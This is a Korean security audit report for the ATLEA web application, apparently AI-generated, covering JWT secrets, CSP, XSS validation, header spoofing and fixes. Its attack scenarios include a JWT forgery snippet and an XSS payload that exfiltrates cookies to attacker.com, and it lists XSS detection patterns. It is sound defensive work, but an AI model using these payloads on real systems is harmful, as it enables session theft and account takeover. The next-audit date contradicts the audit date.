# ATLEA 보안 취약점 감사 보고서

**감사 일자**: 2025-12-31
**감사 범위**: 전체 애플리케이션 보안 (인증, 파일 업로드, 입력 검증, API 보안, 민감 정보 노출)
**심각도 분류**: HIGH / MEDIUM / LOW

---

## 📊 요약

| 심각도 | 개수 | 즉시 조치 필요 |
|--------|------|----------------|
| 🔴 HIGH | 3개 | ✅ 예 |
| 🟡 MEDIUM | 5개 | ⚠️ 권장 |
| 🟢 LOW | 2개 | 선택 |
| **합계** | **10개** | **8개 우선 수정** |

---

## 🔴 HIGH - 즉시 수정 필요

### 1. 약한 기본 JWT SECRET_KEY ⚠️ CRITICAL

**파일**: `src/auth/utils.py:17`

**문제**:
```python
SECRET_KEY = os.getenv("JWT_SECRET_KEY", "your-secret-key-change-in-production")
```

- 환경 변수가 설정되지 않으면 기본값 `"your-secret-key-change-in-production"` 사용
- 이 기본값은 **공개된 값**으로, 공격자가 JWT 토큰을 위조할 수 있음
- 모든 인증 시스템이 무력화됨

**영향**:
- 공격자가 임의의 사용자로 로그인 가능
- 관리자 권한 획득 가능
- 전체 시스템 장악 가능

**공격 시나리오**:
```python
# 공격자가 로컬에서 실행
import jwt
SECRET_KEY = "your-secret-key-change-in-production"
fake_token = jwt.encode({"user_id": "admin", "role": "admin"}, SECRET_KEY, algorithm="HS256")
# 이 토큰으로 모든 API 접근 가능
```

**수정 방법**:
1. 기본값 제거하고 환경 변수 필수로 설정:
```python
SECRET_KEY = os.getenv("JWT_SECRET_KEY")
if not SECRET_KEY:
    raise ValueError("JWT_SECRET_KEY environment variable must be set")
```

2. .env.example에 추가:
```bash
# JWT Secret Key (REQUIRED - use strong random string)
# Generate with: openssl rand -hex 32
JWT_SECRET_KEY=your-very-strong-random-secret-key-here
```

3. 실제 .env 파일에 강력한 랜덤 키 설정:
```bash
openssl rand -hex 32 > /tmp/secret.txt
```

---

### 2. CSP unsafe-inline과 unsafe-eval 사용 ⚠️ HIGH

**파일**: `src/web_server.py:210`

**문제**:
```python
"script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.jsdelivr.net..."
```

- `'unsafe-inline'`: 인라인 스크립트 허용 → XSS 공격 가능
- `'unsafe-eval'`: eval() 함수 허용 → 코드 인젝션 가능
- Content Security Policy의 주 목적(XSS 방어)을 무력화

**영향**:
- XSS 공격으로 사용자 세션 탈취
- 악성 스크립트 실행
- 민감 정보 유출

**공격 시나리오**:
```html
<!-- 공격자가 입력한 질문에 포함 -->
<img src=x onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)">
```

**수정 방법**:
1. nonce 기반 CSP 사용:
```python
import secrets
nonce = secrets.token_urlsafe(16)
response.headers["Content-Security-Policy"] = f"script-src 'self' 'nonce-{nonce}'"
```

2. 인라인 스크립트를 외부 파일로 분리
3. eval() 사용 제거

---

### 3. XSS 검증 순서 오류 ⚠️ HIGH

**파일**: `src/web_server.py:647-682`

**문제**:
```python
@validator('question')
def sanitize_question(cls, v):
    # Line 662: HTML escape 먼저 실행
    sanitized = html.escape(v)

    # Line 665-680: 위험한 패턴 검사 (escape 후라서 무의미)
    for pattern in dangerous_patterns:
        if re.search(pattern, sanitized, re.IGNORECASE):  # 절대 매치 안됨!
            raise ValueError("...")
```

- `html.escape()`가 `<script>` → `&lt;script&gt;`로 변환
- 변환 후 패턴 검사는 의미 없음 (이미 변환됨)
- 위험한 패턴이 우회될 수 있음

**수정 방법**:
```python
@validator('question')
def sanitize_question(cls, v):
    import re
    import html

    if not v or not v.strip():
        raise ValueError("질문을 입력해주세요.")

    if len(v) > 10000:
        raise ValueError("질문이 너무 깁니다.")

    # 1. 먼저 위험한 패턴 검사 (escape 전에)
    dangerous_patterns = [
        r'<script[^>]*>',
        r'javascript:',
        r'onerror\s*=',
        # ... (동일)
    ]

    for pattern in dangerous_patterns:
        if re.search(pattern, v, re.IGNORECASE):  # 원본에서 검사
            raise ValueError("입력에 허용되지 않는 패턴이 포함되어 있습니다.")

    # 2. 그 다음 HTML escape
    sanitized = html.escape(v)

    return sanitized
```

---

## 🟡 MEDIUM - 권장 수정

### 4. JWT 토큰 블랙리스트 없음

**문제**:
- 로그아웃해도 JWT 토큰이 여전히 유효함
- 토큰 탈취 시 로그아웃으로 무효화 불가능
- 토큰 만료 시간까지 계속 사용 가능

**영향**:
- 세션 탈취 공격에 취약
- 계정 탈취 후 로그아웃해도 공격 지속

**수정 방법**:
Redis에 블랙리스트 구현:
```python
def logout(token: str, redis_client):
    payload = jwt.decode(token, SECRET_KEY)
    exp = payload.get("exp")
    ttl = exp - time.time()

    # 만료 시간까지만 블랙리스트에 보관
    redis_client.setex(f"blacklist:{token}", int(ttl), "1")

def verify_token(token: str):
    # 블랙리스트 확인
    if redis_client.exists(f"blacklist:{token}"):
        return None

    # 기존 검증 로직
    return jwt.decode(token, SECRET_KEY)
```

---

### 5. 중복된 require_admin 구현

**문제**:
- `src/auth/utils.py:222-240`에 하나
- `src/auth/middleware.py:91-112`에 하나
- 두 구현이 다른 로직을 사용할 수 있어 일관성 문제

**수정 방법**:
하나로 통일하고 다른 것은 제거

---

### 6. X-Forwarded-For 헤더 스푸핑 가능

**파일**: `src/middleware/rate_limiter_redis.py:166-168`

**문제**:
```python
forwarded = request.headers.get("X-Forwarded-For")
if forwarded:
    return forwarded.split(",")[0].strip()  # 헤더를 무조건 신뢰
```

- 공격자가 `X-Forwarded-For` 헤더를 조작하여 다른 IP로 위장 가능
- Rate limiting 우회 가능

**수정 방법**:
```python
# 신뢰할 수 있는 프록시 IP 리스트
TRUSTED_PROXIES = ["10.0.0.0/8", "172.16.0.0/12"]

def _get_client_id(self, request: Request) -> str:
    # 직접 연결된 IP
    direct_ip = request.client.host if request.client else "unknown"

    # 신뢰할 수 있는 프록시에서 온 경우에만 X-Forwarded-For 사용
    if is_trusted_proxy(direct_ip, TRUSTED_PROXIES):
        forwarded = request.headers.get("X-Forwarded-For")
        if forwarded:
            return forwarded.split(",")[0].strip()

    return direct_ip
```

---

### 7. .env.example에 JWT_SECRET_KEY 누락

**문제**:
- `.env.example` 파일에 `JWT_SECRET_KEY` 항목이 없음
- 개발자가 설정해야 하는 것을 모를 수 있음
- 기본값 사용으로 이어질 수 있음

**수정 방법**:
`.env.example`에 추가:
```bash
# Security - JWT Authentication
JWT_SECRET_KEY=your-very-strong-random-secret-key-here-change-this
# Generate strong key: openssl rand -hex 32
```

---

### 8. HTTPS 강제 없음 (Strict-Transport-Security)

**문제**:
- `Strict-Transport-Security` 헤더 없음
- HTTP로 접속 시 HTTPS로 리다이렉트 없음
- Man-in-the-Middle 공격 가능

**수정 방법**:
```python
# 보안 헤더 미들웨어에 추가
response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"

# 프로덕션 환경에서 HTTP → HTTPS 리다이렉트
if not request.url.scheme == "https" and not is_development():
    return RedirectResponse(
        url=str(request.url).replace("http://", "https://"),
        status_code=301
    )
```

---

## 🟢 LOW - 선택적 개선

### 9. CORS 과도한 권한

**파일**: `src/web_server.py:231`

**문제**:
```python
allow_headers=["*"]  # 모든 헤더 허용
```

**수정 방법**:
```python
allow_headers=[
    "Content-Type",
    "Authorization",
    "X-Requested-With"
]
```

---

### 10. 추가 권장사항

1. **비밀번호 정책 강화**:
   - 최소 길이: 12자 이상
   - 대소문자, 숫자, 특수문자 혼합 필수
   - 자주 사용되는 비밀번호 차단

2. **2FA (Two-Factor Authentication)**:
   - TOTP 기반 2단계 인증 추가
   - 관리자 계정은 필수로 설정

3. **세션 타임아웃**:
   - 비활동 시 자동 로그아웃 (30분)
   - 절대 타임아웃 (24시간)

4. **감사 로깅**:
   - 모든 인증 실패 로그
   - 관리자 작업 로그
   - 민감한 작업 추적

---

## ✅ 양호한 보안 관행

다음 영역은 잘 구현되어 있습니다:

1. **파일 업로드 보안**:
   - Path Traversal 방어 (`validate_filename`)
   - Magic Bytes 검증 (`validate_file_content`)
   - 파일 크기 제한
   - 중복 파일 해시 검증

2. **입력 검증**:
   - Pydantic 모델 검증
   - HTML escape 적용
   - 길이 제한

3. **Rate Limiting**:
   - Redis 기반 구현
   - IP 기반 제한

4. **보안 헤더**:
   - X-Frame-Options: DENY
   - X-Content-Type-Options: nosniff
   - X-XSS-Protection

5. **에러 처리**:
   - `get_safe_error_message` 사용
   - 민감 정보 노출 방지

---

## 🎯 우선순위 수정 계획

### Phase 1 (즉시 - 1일 내):
1. ✅ JWT SECRET_KEY 기본값 제거 및 환경 변수 필수화
2. ✅ .env.example에 JWT_SECRET_KEY 추가
3. ✅ 강력한 랜덤 SECRET_KEY 생성 및 설정

### Phase 2 (1주일 내):
4. ✅ XSS 검증 순서 수정
5. ✅ JWT 토큰 블랙리스트 구현
6. ✅ CSP 정책 개선 (nonce 기반)

### Phase 3 (2주일 내):
7. ✅ X-Forwarded-For 검증 추가
8. ✅ HTTPS 강제 및 HSTS 헤더
9. ✅ CORS 헤더 제한

### Phase 4 (선택):
10. ⚠️ 2FA 구현
11. ⚠️ 비밀번호 정책 강화
12. ⚠️ 감사 로깅 개선

---

## 🔍 테스트 권장사항

1. **침투 테스트**:
   - JWT 토큰 위조 시도
   - XSS 공격 시도
   - Rate limiting 우회 시도

2. **자동화 보안 스캔**:
   - OWASP ZAP
   - Burp Suite
   - `safety` (Python 패키지 취약점)

3. **코드 검토**:
   - `bandit` (Python 보안 linter)
   - `semgrep` (정적 분석)

---

## 📞 문의 및 지원

보안 취약점 발견 시:
1. 즉시 보안팀에 보고
2. 공개 이슈 트래커에 게시 금지
3. 패치 적용 후 공개

---

**보고서 작성**: Claude Code Security Audit
**검토자**: 자동화된 보안 감사 시스템
**다음 감사 예정일**: 2025-06-30 (6개월 후)
